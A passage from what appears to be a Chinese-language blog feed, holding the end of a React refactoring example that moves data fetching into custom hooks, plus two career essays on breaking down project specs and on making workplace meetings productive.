class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useEffect, useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">AddModal</span> <span class="keyword">from</span> <span class="string">&quot;../components/AddModal&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">LoadingIndicator</span> <span class="keyword">from</span> <span class="string">&quot;../components/LoadingIndicator&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">BrowserItem</span> <span class="keyword">from</span> <span class="string">&quot;../components/BrowserItem&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> colors <span class="keyword">from</span> <span class="string">&quot;../config/colors&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Browsers</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">URL</span> = <span class="string">&quot;https://google.com/myData.json&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> [loading, setLoading] = <span class="title function_">useState</span>(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">const</span> [browsers, setBrowsers] = <span class="title function_">useState</span>([]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> [modalVisible, setModalVisible] = <span class="title function_">useState</span>(<span class="literal">false</span>);</span><br><span class="line">  <span class="keyword">const</span> [description, setDescription] = <span class="title function_">useState</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">changeDescription</span> = (<span class="params">description</span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">setDescription</span>(description);</span><br><span class="line">    <span class="title function_">setModalVisible</span>(!modalVisible);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">changeOpacity</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">setModalVisible</span>(!modalVisible);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="variable constant_">URL</span>)</span><br><span class="line">      .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> response.<span class="title function_">json</span>())</span><br><span class="line">      .<span class="title function_">then</span>(<span class="function">(<span class="params">responseJson</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> responseJson.<span class="property">Browsers</span>;</span><br><span class="line">      &#125;)</span><br><span class="line">      .<span class="title function_">then</span>(<span class="function">(<span class="params">browsers</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">setBrowsers</span>(browsers);</span><br><span class="line">        <span class="comment">// console.log(browsers)</span></span><br><span class="line">        <span class="title function_">setLoading</span>(<span class="literal">false</span>);</span><br><span class="line">      &#125;)</span><br><span class="line">      .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span><br><span class="line">      &#125;)</span><br><span class="line">      .<span class="title function_">finally</span>(<span class="function">() =&gt;</span> <span class="title function_">setLoading</span>(<span class="literal">false</span>));</span><br><span class="line">  &#125;, []);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;loading ? (</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">LoadingIndicator</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      ) : (</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">AddModal</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">modalVisible</span>=<span class="string">&#123;modalVisible&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">changeOpacity</span>=<span class="string">&#123;()</span> =&gt;</span> changeOpacity()&#125;</span></span><br><span class="line"><span class="language-xml">            description=&#123;description&#125;</span></span><br><span class="line"><span class="language-xml">          /&gt;</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">List</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">data</span>=<span class="string">&#123;browsers&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">keyExtractor</span>=<span class="string">&#123;(browser)</span> =&gt;</span> browser.fullname&#125;</span></span><br><span class="line"><span class="language-xml">            renderItem=&#123;(&#123; item &#125;) =&gt; (</span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">BrowserItem</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                &#123;<span class="attr">...item</span>&#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                <span class="attr">changeDescription</span>=<span class="string">&#123;()</span> =&gt;</span> changeDescription(item.description)&#125;</span></span><br><span class="line"><span class="language-xml">              /&gt;</span></span><br><span class="line"><span class="language-xml">            )&#125;</span></span><br><span class="line"><span class="language-xml">          /&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">      )&#125;</span><br><span class="line">    &lt;/&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Browsers</span>;</span><br></pre></td></tr></table></figure><p>將資料邏輯切割成更小可以重複使用的 hooks，當這些資料存取寫法被共用時就達到</p><ul><li>加速開發: 因為重複使用</li><li>更快速找到問題: 遇到問題可以減少閱讀和測試這些部分</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useEffect, useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">useFetch</span>(<span class="params">url</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [loading, setLoading] = <span class="title function_">useState</span>(<span class="literal">false</span>);</span><br><span class="line">  <span class="keyword">const</span> [data, setData] = <span class="title function_">useState</span>(<span class="literal">undefined</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">setLoading</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="title function_">fetch</span>(url)</span><br><span class="line">      .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> response.<span class="title function_">json</span>())</span><br><span class="line">      .<span class="title function_">then</span>(setData)</span><br><span class="line">      .<span class="title function_">finally</span>(<span class="function">() =&gt;</span> <span class="title function_">setLoading</span>(<span class="literal">false</span>))</span><br><span class="line">      .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> <span class="title class_">Alert</span>.<span class="title function_">alert</span>(<span class="string">&quot;Fetch error&quot;</span>, error));</span><br><span class="line">  &#125;, [url]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    loading,</span><br><span class="line">    data,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">useBrowsers</span>(<span class="params">url</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; loading, data &#125; = <span class="title function_">useFetch</span>(url);</span><br><span class="line">  <span class="keyword">const</span> [selectedBrowser, setSelectedBrowser] = <span class="title function_">useState</span>(<span class="literal">undefined</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    loading,</span><br><span class="line">    <span class="attr">browsers</span>: data?.<span class="property">Browsers</span>,</span><br><span class="line">    selectedBrowser,</span><br><span class="line">    setSelectedBrowser,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>切割成更小可重用的元件且拿掉大部分的資料邏輯，僅留下 conditional render 的相關實作，元件行數下降找問題的速度肯定又更上層樓。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">UIFriendlyList</span>(<span class="params">props</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (props.<span class="property">loading</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">LoadingIndicator</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (props?.<span class="property">data</span> &amp;&amp; props.<span class="property">data</span>.<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">Text</span>&gt;</span>This list is empty (<span class="tag">&lt;/<span class="name">Text</span>&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">List</span> &#123;<span class="attr">...props</span>&#125; /&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// BrowsersList.tsx</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">BrowsersList</span>(<span class="params">props</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; loading, selectedBrowser, setSelectedBrowser, browsers &#125; = props;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">View</span> <span class="attr">style</span>=<span class="string">&#123;styles.container&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">AddModal</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">modalVisible</span>=<span class="string">&#123;Boolean(selectedBrowser)&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">onClose</span>=<span class="string">&#123;()</span> =&gt;</span> setSelectedBrowser(undefined)&#125;</span></span><br><span class="line"><span class="language-xml">        description=&#123;selectedBrowser?.description&#125;</span></span><br><span class="line"><span class="language-xml">      /&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">UIFriendlyList</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">loading</span>=<span class="string">&#123;loading&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">data</span>=<span class="string">&#123;browsers&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">renderItem</span>=<span class="string">&#123;(&#123;</span> <span class="attr">item</span> &#125;) =&gt;</span> (</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">BrowserItem</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">key</span>=<span class="string">&#123;item.fullname&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">browser</span>=<span class="string">&#123;item&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">onPress</span>=<span class="string">&#123;()</span> =&gt;</span> setSelectedBrowser(item)&#125;</span></span><br><span class="line"><span class="language-xml">          /&gt;</span></span><br><span class="line"><span class="language-xml">        )&#125;</span></span><br><span class="line"><span class="language-xml">      /&gt;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">View</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Browsers</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">BrowsersList</span> &#123;<span class="attr">...useBrowsers</span>(&quot;<span class="attr">https:</span>//<span class="attr">google.com</span>/<span class="attr">myData.json</span>&quot;)&#125; /&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 三分鐘斷捨離 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>能不能給我一首歌的時間，把 Spec 說完才說再見</title>
      <link href="/2023/10/12/simplify-your-life/thinking-communication/"/>
      <url>/2023/10/12/simplify-your-life/thinking-communication/</url>
      
        <content type="html"><![CDATA[<p>在生活中，注意力就像一個珍貴的資源，這是斷捨離和重要性原則的核心之一。</p><blockquote><p>必須意識到時間和注意力是有限的資源</p></blockquote><iframe width="560" height="315" src="https://www.youtube.com/embed/wt0RKW3aC84?si=spbOdzRc5sLyZx4Z" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><p>由於網路的快速發展，生活中的雜訊越來越多，漸漸開始過著被垃圾資訊和物質淹沒的人生。</p><p>在有限的注意力下，訊息的投放也就越來越困難，根據紫牛理論，東西要狂要特殊才有辦法吸引到人的注意，在社群資訊爆量的時代更是需要如此。</p><p>然而在職場上很常有講幹話或是無腦式的開會來各種消耗我們有限的注意力，煩躁之餘就會開始去想為什麼會有這樣的問題，以下是個人想法:</p><ul><li>認知層次不同: 工作是需要專業技能的，<code>1 + 1 = 2</code> 這樣的問題仍可能有認知上的區別差異</li><li>成功經驗不同: 對追求成功以及成功的定義都有差異，導致在職場中大家就不是同路人</li><li>民主的代價: 在不同認知和價值觀之間，溝通往往需要更多的努力和時間</li></ul><p>1 + 1 從數學上來說當然相加就是二，可是兩個人分開或是 co-work 的產出卻不一定是 2 了？</p><p>人的大腦並不適合處理過多繁瑣的工作 (例如記憶、處理和提醒)，為了應對這個限制，我們會透過直覺捨棄不必要的瑣碎事物，以釋放更多的心智空間而不是過度思考。</p><ul><li>快思: 透過直覺來應對生活中的大多數事情</li><li>慢想: 專注於真正重要的事情</li></ul><p>要確保整個系統 (AKA 我們的生活和工作) 能夠有條不紊地運行，關鍵在需要定期進行回顧和檢討。</p><h2 id="任務的分類"><a href="#任務的分類" class="headerlink" title="任務的分類"></a>任務的分類</h2><p>首先可以針對任務進行分類：</p><ul><li>事前規劃任務: 用於預先計劃和組織事務</li><li>突發狀況任務: 需要迅速應對和解決的意外事件</li><li>待確認的任務: 需要更多思考和決策的事情</li></ul><p>有了上面的分類後，在回顧過程中可以透過分類來檢討任務，確保我們不會遺漏重要的事情，同時提供更好的視野和方向。</p><ul><li>已完成的任務: 收尾</li><li>下一步的行動: 未來可能需要處理的事項</li><li>待確認的任務: 懸而未決的事項</li></ul><p>一個有用的技巧是強迫自己從跑道的角度提升至空中，從全局的角度觀察並確認方向，這樣我們可以更好地了解整個局勢，確保我們不僅關注當前的任務和挑戰，還關注更大的圖景和長期目標。</p><p>通過有效地管理和分類事情，我們可以更好地利用有限的注意力資源並提高生產力。</p><h2 id="任務的規劃與回顧"><a href="#任務的規劃與回顧" class="headerlink" title="任務的規劃與回顧"></a>任務的規劃與回顧</h2><p>在任務規劃與執行大致上就是下面四個步驟</p><blockquote><p>計畫 -&gt; 執行 -&gt; 確認 -&gt; 修正計畫</p></blockquote><p>計畫出現了兩次也就是說紙上談兵遠比實際打仗重要，代表戰略上的想法遠大於戰術上的執行。</p><p>舉個例子來說，今天一群訓練有素的重裝騎兵，各種實戰技巧及執行戰術的能力都很優良，如果是在沙漠遇到長槍兵，94.87% 的可能是被滅團的，可若是駱駝騎兵配上弓箭，對上長槍兵那情況可能就大不相同。</p><p>在網路業中專案中的使用者介面是需要設計一起加入，所以並無法直接由參數的規格書得到成果。</p><p>首先必須從全局的角度觀察確認好相關的方向之後，才是去定義使用者故事或是把需求降成小任務，最後把故事或是小任務轉化成使用者介面。</p><p>當使用者介面完成設計後，才會由後端攻城獅接棒提供故事裡的腳色資料，前端攻城獅作為大家的橋樑把介面實作出來且協助後端攻城獅共同定義出所需的資料格式，整個任務的拆解及協作的流程或許就會比較順暢。</p><h3 id="升維思考"><a href="#升維思考" class="headerlink" title="升維思考"></a>升維思考</h3><blockquote><p>升維思考的目的在確認方向</p></blockquote><p>工作上來說，老闆常常用的是升維後的飛天思考，大多只是提出一個戰略上的方向，像是搞一個應用 <code>E=mc^2</code> 的超光速閃電霹靂機?</p><p>攻城獅們卻是需要讓飛機先落地，把零件拆解到基本單位才有辦法個別擊破去做戰術上的實行，就像是實務上需要應用流體力學方程式，但想調整方程式參數時也需要逐步降維先把未知變數消去，簡化問題才有辦法找到答案。</p><p>不停的把問題維度拉高，好處可以增加方程式的應用範圍讓飛機更強，但就會像生活中的雜訊一樣，導致訊息投放及解析上的困難，造成溝通上的成本。</p><h2 id="降維執行"><a href="#降維執行" class="headerlink" title="降維執行"></a>降維執行</h2><p>舉三國時代草船借箭的例子，一個目標就是在十天內得到十萬支箭，在以前沒有工廠的年代且位於正在打仗的場地，這明顯是一個飛天的思考。</p><p>諸葛亮當時的腳色就是把腦中多變數的問題降維且拆解到可執行的任務，由於時間資源有限並不太可能實際上去製造，於是將任務改成使用草人來蒐集，拆解成讓士兵去砍草和紮草人最後安裝完成起霧之後出發即可。</p><p>可是如果讓大家自由討論說我們要怎麼湊齊十萬支箭，在漫長的開會以及尋找資源的過程中，錯過了起霧的時間，最後就會連諸葛孔明也救不了你…</p><blockquote><p>資源有限，怎麼學會降維，讓每個人都專注做好一件事情，很明顯是一種降低溝通成本的方法</p></blockquote><h2 id="任務的執行"><a href="#任務的執行" class="headerlink" title="任務的執行"></a>任務的執行</h2><p>以專案來說，覺得簡單區分成功能性和介面兩塊來看:</p><ol><li>功能性: 重視與工程師的溝通，需確認有哪些資訊能夠呈現，以及從飛天的需求降維到各種低維度的文件</li></ol><ul><li>確認賣點以及要解決的問題: 一球入魂的去解決，紮草人就不要想造箭</li><li>定義量的大小: 使用量或著是資訊量，一萬跟一億的存錢做法肯定是不同的</li></ul><ol start="2"><li>介面與訊息: 重視的是和消費者的溝通，適當的投放訊息誘導</li></ol><ul><li>解決痛點: 從功能出發，直球訊息解決，大家都聽過的案例就是搜尋找 google，由於產品的成功所以也達到了洗腦認知的效果，像是你去 google 一下</li><li>利益誘導: 透過心靈肉體的吸引來滿足，算是讓你多轉幾個彎然後轉角遇到愛，網路拍賣就是利用購物金及免運的利益誘導來達到洗腦認知，讓大家開始漸漸賣東西找蝦皮，還會知道超取免運</li><li>洗腦認知: 信仰崇拜重建價值，看不見的誘導跟習慣的養成，成功的讓人們聯想是很猛的，即便現在橫空出世了一個好作品，但之前的產品已經成功洗腦大家的認知與大量改變使用習慣，即便是橫空出世傳說中的好作品可能也只會成為傳說，就像 Seafood 是讓人感恩讓人讚嘆的?</li></ul><p>剛剛講了那麼多其實都還不需要走到開工的階段，當格式定義清楚，就只需要少部分的人掌握全貌即可，讓士兵簡單的做砍草跟紮草人的效率絕對是最高的，在大家的認知與成功經驗還沒統合前，這樣 1+1 才有機會等於 2，而不是過多的經驗統合討論來虛耗大家珍貴的注意力。</p>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 專案管理 </tag>
            
            <tag> 職場老鳥必點技能 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>開會是謀財害命還是協作解決</title>
      <link href="/2023/10/11/simplify-your-life/career-meeting/"/>
      <url>/2023/10/11/simplify-your-life/career-meeting/</url>
      
        <content type="html"><![CDATA[<p>大家有沒有一種經驗就是照三餐開會，到底怎麼那麼多會議要開?</p><blockquote><p>生命以時間為單位，浪費別人的時間是謀財害命，浪費自己的時間則是慢性自殺<br>魯迅</p></blockquote><iframe width="560" height="315" src="https://www.youtube.com/embed/jVbdvH_QAj4?si=GjVsVODu5jd_MgMu&amp;start=163" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><p>工作久了，常常需要參加各種會議，而對於工程師來說，會議的目的通常包括以下幾種：</p><ul><li>產生結論: 目的是為了做出某個重要的決策或結論，以推動專案或工作的進展</li><li>產生會議紀錄: 有些會議需要產生正式的會議紀錄，甚至可能需要拍照或上傳文件以供日後參考</li><li>讓主管了解工作狀態: 向主管匯報工作進展情況，以確保大家方向</li><li>想要找人討論解決方法: 為了解決特定的問題或挑戰，並找到解決方案</li></ul><h2 id="開會的命題"><a href="#開會的命題" class="headerlink" title="開會的命題"></a>開會的命題</h2><p>開會前提是為了解決某些需要合作的問題，先不論會議的目的如何，重要的是在開會之前明確定義會議的命題，命題是為了讓參與者了解會議背後的目的和內容。</p><blockquote><p>開會前或後重要的是維持 bounded context，透過正確的命題來讓背後的問題能真正獲得解決</p></blockquote><p>命題的關鍵在於定義並告知<strong>為何重要</strong> (Why Impact)，避免多個部門之間的協調和確認流程上的決策成本產生，使決策的來源和原因變得明確 (AKA 老闆的意圖)。</p><blockquote><p>說法一: 幫我把這個按鈕加⼤，顏⾊⽤明顯⼀點<br>說法二: 客⼾反應會員續訂的機率有點低，實際訪談後發現很多⼈沒有注意到按鈕，請問有更好的呈現⽅式嗎？</p></blockquote><h2 id="開會常見問題"><a href="#開會常見問題" class="headerlink" title="開會常見問題"></a>開會常見問題</h2><p>在會議中，一些常見的問題包括:</p><ul><li>填充式發言: 按照舊的 Scrum Guide，發言的目的變成了讓主管和其他人覺得工作進展很多，而不是討論如何優化和成長，所以 Scrum Guide 2020 已經刪除了 3QF (三個問題格式)</li><li>語言訊息投放量: 透過語言傳遞的訊息量和種類都不能太多，以確保內容能夠被有效傳達</li><li>不在乎開會成本: 只能用時間來問，譬如提醒大家只討論真正重要的議題，並將詢問能不能將爭論的問題留到最後</li></ul><blockquote><p>要讓別人感覺到你是一個人，不然就只是一直投廣告<br>溝通是否達陣，關鍵在控制對方要聽到什麼</p></blockquote><h2 id="開會的方式"><a href="#開會的方式" class="headerlink" title="開會的方式"></a>開會的方式</h2><blockquote><p>會議的重點應該是讓大家了解其他人的發言跟自己有什麼關係。</p></blockquote><p>在選擇開會方式時，可以根據不同的情況和目的進行區分：</p><p>按照頻率區分</p><ul><li>日會: 比較常會拿來快速同步狀態</li><li>週會: 通常像是部門週會或是跟主管的 1 on 1</li><li>月會: 在新創通常會有一個 All Hands Meeting，會跟大家同步公司的消息</li></ul><p>按照場地區分</p><ul><li>遠端開會</li><li>實體開會</li></ul><p>按人數區分</p><blockquote><p>人多的會議不重要，重要的會議人不多</p></blockquote><ul><li>人多的大型會議: 如果缺乏明確的議程和目標，會議可能變得混亂淪為形式主義且不容易達到共識或決策</li><li>人不多小型會議： 精選參與者通常代表有更多的投入和責任感，更有可能達到明確的目標</li></ul><h3 id="Daily-Scrum-日會"><a href="#Daily-Scrum-日會" class="headerlink" title="Daily Scrum 日會"></a>Daily Scrum 日會</h3><p>常見的 Daily Scrum 會有三個制式的問題</p><ul><li>昨天做了什麼</li><li>今天打算做什麼</li><li>遇到了什麼問題</li></ul><p>雖然 3QF 在 2017 年就改成一個範例，但大家慢慢發現這個輪流回答的格式本身不一定會促進協作。</p><p>每個人會機械式等待，並且進行填空問答，若是主管在場目的就會變成裝忙。</p><p>個人認為比較好的取代方案是透過像是 slack 的聊天機器人，有問題的時候也可以針對討論串進行回覆。</p><ul><li><a href="https://standupalice.com/">https://standupalice.com/</a></li><li><a href="https://geekbot.com/">https://geekbot.com/</a></li></ul><p>在 scrum guild 2020 之後這個 3QF 就改成</p><blockquote><p>The Developers can select whatever structure and techniques they want.</p></blockquote><h3 id="週會"><a href="#週會" class="headerlink" title="週會"></a>週會</h3><p>週會通常用於同步工作進度和狀態，根據小編的過去經驗，週會的主要目的是確保團隊的工作進展順利。</p><p>前公司部門額外需要安排輪值會議紀錄，後來建議主管開會前大家先把想講的提早撰寫於會議紀錄。</p><ul><li>開會前主管可以先閱讀，開會時若與業務無關也可以做想做的事情</li><li>負責維護會議紀錄的人也可以專心開會而不會感到阿雜</li></ul><h2 id="優化會議成果的方法"><a href="#優化會議成果的方法" class="headerlink" title="優化會議成果的方法"></a>優化會議成果的方法</h2><ol><li>不討論不知道的事情</li><li>討論目的性，方法</li><li>會前、會後提供摘要和筆記</li><li>痛過才想學，先操作再講解</li><li>需要得到答案，可以從問答題變是非題或選擇題</li><li>避免答非所問，給版型或限制回答，限制會讓回答變得更簡單</li></ol><h3 id="輔助開會的工具"><a href="#輔助開會的工具" class="headerlink" title="輔助開會的工具"></a>輔助開會的工具</h3><p>有一些輔助開會的工具可供使用，例如使用用戶故事、領域驅動設計（DDD）和統一建模語言（UML）等工具來協助溝通。此外，使用 Trello、看板等工具可以增加會議的透明度。</p><h3 id="提問的方式"><a href="#提問的方式" class="headerlink" title="提問的方式"></a>提問的方式</h3><p><a href="https://linyencheng.github.io/2023/10/09/simplify-your-life/how-to-ask-questions/">提問嗎?你要去哪裡?</a></p><p>小編在之前的文章中從提問的目的、問題的分類、針對問題事前準備、提問的步驟、描述問題的技巧來看怎麼問問題，這裡一樣附上幾個例子，目的都是盡量將蒐集過重要的資訊和脈絡講清楚</p><ol><li>目的: 確認對方想法</li><li>結果: 確定議題結束</li></ol><blockquote><p>問法一: 這個功能兩個禮拜後要完成可以嗎?<br>問法二: 客⼾三週後要跟⻑官報告但系統還有⼀些問題，想確認⽬前⼯作項⽬與優先順序以及是否有時間處理？</p></blockquote><hr><blockquote><p>問法一: 請問 YAML 是什麼？<br>問法二: 網路上說 YAML 可以讓 CICD 更方便，但我還是有點不了解應⽤⽅式，可以請你評估看看讓我了解是否適合⽤在這個專案嗎？</p></blockquote><hr><blockquote><p>問法一: ⽼闆，你要這個嗎？<br>問法二: 經評估為產⽣ $$$ 效益，⽬前規劃 3 種⽅案，這些⽅案差異在於 OOO、因此目前解決方案是是 XXX 且需要 %%% 部⾨資源，想了解有什麼想法和建議?</p></blockquote><hr><blockquote><p>問法一: 上次說的購物車功能，開發好了嗎？<br>問法二: 關於購物車的流程優化的功能，原本預計下週三完成，⽬前還順利嗎？</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 職場老鳥必點技能 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>為你寫下這份文件讓專案 Go</title>
      <link href="/2023/10/10/simplify-your-life/how-to-write-documentation/"/>
      <url>/2023/10/10/simplify-your-life/how-to-write-documentation/</url>
      
